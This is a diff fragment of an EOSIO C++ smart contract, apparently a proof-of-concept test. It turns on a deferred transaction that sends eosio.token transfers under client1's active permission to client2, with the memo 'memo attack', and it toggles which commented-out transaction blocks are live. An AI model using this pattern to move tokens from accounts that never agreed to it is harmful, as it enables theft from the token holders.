@@ -54,10 +54,10 @@ class [[eosio::contract]] CallContract: public contract{
 			//out1.actions.emplace_back(permission_level{_self, "active"_n}, targetContract , method , std::make_tuple(name("client2"),idxa,t));
             //cleos push action eosio.token transfer '["client1","client2","1.0000 EOS","memo"]' -p client1
 			
-			//out1.actions.emplace_back(permission_level{client1, "active"_n}, targetContract , method , std::make_tuple(client1, client2 ,t,"memo attack"));
+			out1.actions.emplace_back(permission_level{client1, "active"_n}, targetContract , method, std::make_tuple(client1, client2 ,extended_asset(1000, extended_symbol(symbol(symbol_code("EOS"),4), name("eosio.token"))) , std::string("memo attack")));
 			//transaction transfer;
 			//transfer.actions.emplace_back(eosio::permission_level {_self, N(active) }, N(eosio.token), N(transfer), std::make_tuple(from_account, to_account_1, quantity_to_send, std::string("memo")));
-            //out1.send( idx+1, client1);
+            out1.send( idx+1, client1);
 			/*
 			transaction trx{};
 			{
@@ -73,9 +73,8 @@ class [[eosio::contract]] CallContract: public contract{
 			trx.delay_sec = 0;
 			trx.send(idx, client1);
 			*/
-
 		//for ( int i=0; i< 2; i++){
-/*
+		/*
 		action(permission_level{client1, "active"_n},
 			name("eosio.token"), 
 			"transfer"_n,
@@ -87,8 +86,9 @@ class [[eosio::contract]] CallContract: public contract{
 			)
 		).send();
 		}
+		*/
 
-*/
+		/*
 		transaction trx{};
 		{
 			trx.actions.emplace_back(
@@ -107,7 +107,7 @@ class [[eosio::contract]] CallContract: public contract{
 		trx.delay_sec = 0;
 		trx.send(idx, client1);
 
-
+		*/
 		print("[#] Send To Target Contract ");
 		}
 
